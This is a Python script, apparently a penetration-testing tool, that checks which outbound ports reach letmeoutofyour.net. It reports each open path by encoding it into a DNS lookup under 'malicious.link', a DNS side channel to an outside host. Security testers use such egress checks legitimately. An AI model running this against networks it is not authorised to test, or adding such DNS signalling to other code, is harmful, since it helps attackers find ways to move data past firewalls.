#!/usr/bin/env python3
import requests
import base64
import socket
import random
import string

ports = [80,443,445,8080,3389,22,21]
domain = "letmeoutofyour.net"
dns = "malicious.link"
verbose = True

# Create a random to make sure caching doesn't stop responses
rnd = ''.join(random.choice(string.ascii_lowercase) for i in range(10))

# Verbosity - set to False above if you don't want output
def vprint(status):
  if verbose == True:
    print(status)

def check(base, domain, port):
  port = str(port)
  vprint("Testing: " + base + domain + ":" + port)
  try:
    r = requests.get(base + domain + ":" + port, timeout=1)
    result = r.text.strip()
    vprint(result)
    if result == "w00tw00t":
      encoded = base64.b32encode(str.encode(base + domain + ":" + port))
      encoded = encoded.replace(b"=", str.encode("-A"))  # We do this so DNS resolves correctly
      hostname = rnd + "." + encoded.decode('utf-8') + "." + dns
      vprint(hostname)
      hostname = hostname.encode('utf-8')
      try:
        success = socket.gethostbyname(hostname)
      except socket.gaierror:
        vprint("no resolution")
  except requests.exceptions.ConnectionError:
    vprint("Failed to connect")

for port in ports:
  # Test HTTP
  base = "http://"
  check(base, domain, port)
  # Test HTTPS
  base = "https://"
  check(base, domain, port)
